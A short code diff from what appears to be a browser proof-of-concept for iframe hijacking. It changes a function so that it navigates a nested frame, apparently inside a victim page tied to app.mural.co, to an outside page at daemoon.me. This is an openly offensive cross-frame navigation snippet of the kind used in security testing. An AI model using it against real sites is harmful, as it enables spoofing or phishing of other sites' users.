@@ -17,9 +17,7 @@
         // Method 1: Open a new tab, then hijack the iframe by targeting its name
         function openNewTab() {
             let x = document.getElementsByClassName("badr")[0];
-            console.log(typeof(document.getElementsByClassName("badr")));
-            console.log(document.getElementsByClassName("badr"));
-            x.frames[0].location.href = "https://daemoon.me/alert.html"
+            x.contentWindow.frames[0].location.href = "https://daemoon.me/alert.html"
             // 1. Open victim.html (which contains <iframe name="myframe">)
             // window.open("https://app.mural.co/", "_blank");
 
